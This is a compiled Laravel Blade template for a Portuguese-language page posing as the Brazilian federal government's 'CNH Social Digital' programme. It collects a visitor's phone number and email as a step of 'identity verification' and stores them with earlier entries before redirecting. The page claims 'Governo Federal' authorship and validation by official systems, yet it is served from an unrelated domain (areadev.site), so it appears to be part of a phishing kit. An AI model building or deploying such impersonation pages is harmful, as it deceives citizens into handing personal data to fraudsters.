<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div>
                        <h1 class="text-2xl md:text-3xl font-bold text-govBlue mb-2">Verificação de Identidade</h1>
                    </div>
                    <p class="text-sm text-foreground leading-relaxed">Preencha este breve questionário para verificarmos sua elegibilidade para a CNH Digital Social. Este é um passo inicial e não garante a emissão da CNH.</p>
                    <div class="space-y-4">
                        <div class="flex items-center gap-2">
                            <div class="bg-govBlue text-white rounded-full w-7 h-7 flex items-center justify-center font-bold text-sm">3</div>
                            <h2 class="text-base font-semibold text-foreground">Qual é seu telefone?</h2>
                        </div>
                        <div class="space-y-2">
                            <input type="tel" class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm text-base" placeholder="(00) 00000-0000" maxlength="15" value="" id="phone">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div class="flex items-center gap-2 mt-6">
                            <div class="bg-govBlue text-white rounded-full w-7 h-7 flex items-center justify-center font-bold text-sm">4</div>
                            <h2 class="text-base font-semibold text-foreground">Qual é seu e-mail?</h2>
                        </div>
                        <div class="space-y-2">
                            <input type="email" class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm text-base" placeholder="seu@email.com" value="" id="email">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                    </div>
                    <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-5 text-base font-semibold transition-colors bg-govBlue hover:bg-govBlue/90 text-white" id="btnContinuar">Confirmar</button>
                    <div class="border-l-4 border-govBlue bg-govBlue/5 p-4 rounded space-y-2">
                        <h3 class="text-lg font-bold text-foreground">Processo 100% Seguro</h3>
                        <p class="text-sm text-muted-foreground">Todas as informações são validadas pelos sistemas oficiais do Governo Federal, garantindo total segurança e autenticidade em seu processo de inscrição.</p>
                    </div>
                    <div class="text-center pt-4"></div>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
    const userData = JSON.parse(sessionStorage.getItem("userData"));
    if(!userData){
        window.location.href = "<?php echo e(url('/login')); ?>";
    }

    function validarEmail(email) {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(email);
    }

    $("#phone").focus(function(){
        $(this).mask("(99) 99999-9999");
    });  

    $("#phone").mask("(99) 99999-9999").focusout(function (event) {  
        var target, phone, element;  
        target = (event.currentTarget) ? event.currentTarget : event.srcElement;  
        phone = target.value.replace(/\D/g, '');
        element = $(target);  
        element.unmask();  
        if(phone.length > 10) {  
            element.mask("(99) 99999-9999");  
        } else {  
            element.mask("(99) 9999-9999");  
        }  
    });

    $('#phone').on('input', function () {
        $(this).removeClass('border-red-500').addClass('border-input');
        $(this).next('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');
    });

    $('#email').on('input', function () {
        $(this).removeClass('border-red-500').addClass('border-input');
        $(this).next('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');
    });

    $(document).on('click', '#btnContinuar', function () {

        let email = $('#email').val().trim();
        let telefone = $('#phone').val().trim();
        let hasError = false;

        $('#email, #phone').removeClass('border-red-500').addClass('border-input');
        $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');

        if (!validarEmail(email)) {
            $('#email').addClass('border-red-500').removeClass('border-input');
            $('#email').next('p[data-testid="error-message"]')
                .removeClass('hidden').addClass('flex')
                .html(`
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                        stroke-linecap="round" stroke-linejoin="round" 
                        class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" x2="12" y1="8" y2="12"></line>
                        <line x1="12" x2="12.01" y1="16" y2="16"></line>
                    </svg>
                    <span>Informe um endereço de e-mail válido.</span>
                `);
            hasError = true;
        }

        if (email === '') {
            $('#email').addClass('border-red-500').removeClass('border-input');
            $('#email').next('p[data-testid="error-message"]')
                .removeClass('hidden').addClass('flex')
                .html(`
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                        stroke-linecap="round" stroke-linejoin="round" 
                        class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" x2="12" y1="8" y2="12"></line>
                        <line x1="12" x2="12.01" y1="16" y2="16"></line>
                    </svg>
                    <span>O endereço de e-mail é obrigatório.</span>
                `);
            hasError = true;
        }

        if(telefone.length < 14) {
            $('#phone').addClass('border-red-500').removeClass('border-input');
            $('#phone').next('p[data-testid="error-message"]')
                .removeClass('hidden').addClass('flex')
                .html(`
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                        stroke-linecap="round" stroke-linejoin="round" 
                        class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" x2="12" y1="8" y2="12"></line>
                        <line x1="12" x2="12.01" y1="16" y2="16"></line>
                    </svg>
                    <span>Informe um telefone válido.</span>
                `);
            hasError = true;
        }

        if (telefone === '') {
            $('#phone').addClass('border-red-500').removeClass('border-input');
            $('#phone').closest('.relative').next('p[data-testid="error-message"]')
                .removeClass('hidden').addClass('flex')
                .html(`
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                        stroke-linecap="round" stroke-linejoin="round" 
                        class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" x2="12" y1="8" y2="12"></line>
                        <line x1="12" x2="12.01" y1="16" y2="16"></line>
                    </svg>
                    <span>O telefone é obrigatório.</span>
                `);
            hasError = true;
        }

        if (hasError) return;

        $(this).text('Processando...').attr('disabled', true);

        userData.email = email;
        userData.telefone = telefone;
        sessionStorage.setItem("userData", JSON.stringify(userData));

        setTimeout(() => {
            window.location.href = "<?php echo e(url('/validacao')); ?>";
        }, 1200);

     });
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/informacoes-contato.blade.php ENDPATH**/ ?>